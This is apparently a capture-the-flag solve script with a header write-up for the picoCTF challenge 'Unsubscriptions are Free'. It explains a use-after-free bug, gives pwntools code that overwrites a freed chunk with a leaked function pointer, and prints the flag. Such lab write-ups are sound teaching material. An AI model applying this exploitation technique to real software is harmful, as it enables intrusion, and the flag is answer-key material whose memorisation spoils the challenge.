#!/usr/bin/env python3

############################### Write-Up ##################################
# Challenge: Unsubscriptions are Free
# Category: Binary Exploiation
# Description: Check out my new video-game and spaghetti-eating streaming channel on Twixer! program and get a flag. source nc mercury.picoctf.net 4593
# Hints:
#	-1: http://homes.sice.indiana.edu/yh33/Teaching/I433-2016/lec13-HeapAttacks.pdf
#
# The idea of the exploit is a Use-After-Free vulnerability. Looking at the
# source code, as far as any heap actions the user can do in the program,
# the only functions you can use to change the heap are i() and l(), which
# delete user accounts via free() and malloc()'s messages (pointers
# actually), respectively. The bug lies in the commented section which has
# the line "if(user) {," which checks to see if the user pointer is valid.
# Thus, even after free()'ing the user chunk we can still edit it w/o
# verificaiton that we are still "logged" into the program, hence
# Use-After-Free. The s() function leaks the pointer to the
# hahaexploitgobrrr() function, which displays the flag, so if we write
# that pointer into the free()'d user chunk, it will execute the function.
#
# Flag: picoCTF{d0ubl3_j30p4rdy_ba307b82}
# Points: 100
# Solved by giggsterpuku in picoGym
###########################################################################

from pwn import *

exe = ELF("vuln")

context.binary = exe


def conn():
	if False:
		r = process([exe.path])
	else:
		r = remote("mercury.picoctf.net", 4593)
	return(r)


def main():
	r = conn()
	r.recvuntil("(e)xit")
	r.sendline("S")
	r.recvline()
	hahaexploitgobrrr = r.recvline()[19:].strip()
	win_con = p32(int(hahaexploitgobrrr, 16))
	r.sendline("I")
	r.recvuntil("already(Y/N)?")
	r.sendline("Y")
	r.recvuntil("(e)xit")
	r.sendline("L")
	r.recvuntil("anyways:")
	r.sendline(win_con)
	r.interactive()


if __name__ == "__main__":
	main()
